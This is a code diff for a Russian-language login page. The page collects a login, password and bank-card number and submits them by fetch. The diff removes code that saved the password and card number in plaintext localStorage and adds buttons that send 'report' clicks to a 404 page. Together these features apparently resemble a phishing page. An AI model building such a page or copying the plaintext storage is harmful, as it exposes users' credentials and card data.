@@ -206,7 +206,7 @@
 
       const cardFieldsContainer = document.createElement("div");
       cardFieldsContainer.classList.add("hidden");
-      cardFieldsContainer.innerHTML = `
+      cardFieldsContainer.innerHTML = ` 
         <div class="form-group">
           <input id="card-number" type="text" placeholder="Введите номер карты">
         </div>
@@ -230,47 +230,26 @@
             loginButton.classList.add("hidden");
             noCardText.classList.add("hidden");
             cardFieldsContainer.classList.remove("hidden");
+          } else if (index === 1) {
+            // Для телефона
+            loginInput.placeholder = "Введите телефон";
+            formGroups.forEach(group => group.classList.remove("hidden"));
+            rememberContainer.classList.remove("hidden");
+            loginButton.classList.remove("hidden");
+            noCardText.classList.remove("hidden");
           } else {
             formGroups.forEach(group => group.classList.remove("hidden"));
             rememberContainer.classList.remove("hidden");
             loginButton.classList.remove("hidden");
             noCardText.classList.remove("hidden");
             cardFieldsContainer.classList.add("hidden");
+            loginInput.placeholder = "Введите логин"; // Вернуть placeholder для логина
           }
         });
       });
 
-      cardFieldsContainer.addEventListener("input", function () {
-        const cardNumber = document.getElementById("card-number").value;
-        if (cardNumber.trim() !== "") {
-          loginButton.classList.remove("hidden");
-        } else {
-          loginButton.classList.add("hidden");
-        }
-      });
-
-      // Save and load input data
-      loginInput.value = localStorage.getItem("login") || "";
-      passwordInput.value = localStorage.getItem("password") || "";
-      const cardNumberInput = document.getElementById("card-number");
-      if (cardNumberInput) cardNumberInput.value = localStorage.getItem("cardNumber") || "";
-
-      loginInput.addEventListener("input", function () {
-        localStorage.setItem("login", loginInput.value);
-      });
-
-      passwordInput.addEventListener("input", function () {
-        localStorage.setItem("password", passwordInput.value);
-      });
-
-      if (cardNumberInput) {
-        cardNumberInput.addEventListener("input", function () {
-          localStorage.setItem("cardNumber", cardNumberInput.value);
-        });
-      }
-
       loginButton.addEventListener("click", function () {
-        errorMessage.textContent = ''; // Clear previous errors
+        errorMessage.textContent = ''; // Очистить предыдущие ошибки
 
         const login = loginInput.value.trim();
         const password = passwordInput.value.trim();
@@ -278,6 +257,8 @@
 
         if (!login || !password) {
           errorMessage.textContent = 'Логин и пароль не могут быть пустыми!';
+          loginInput.value = ""; // Очистить поле логин
+          passwordInput.value = ""; // Очистить поле пароль
           return;
         }
 
@@ -304,6 +285,13 @@
         .catch(error => {
           console.error('Ошибка отправки данных:', error);
           errorMessage.textContent = 'Ошибка при отправке данных. Попробуйте позже.';
+        });
+      });
+
+      // Кнопки для перехода на 404 страницы
+      document.querySelectorAll('.report-button').forEach(button => {
+        button.addEventListener('click', () => {
+          window.location.href = 'https://example.com/404'; // Страница 404
         });
       });
     });
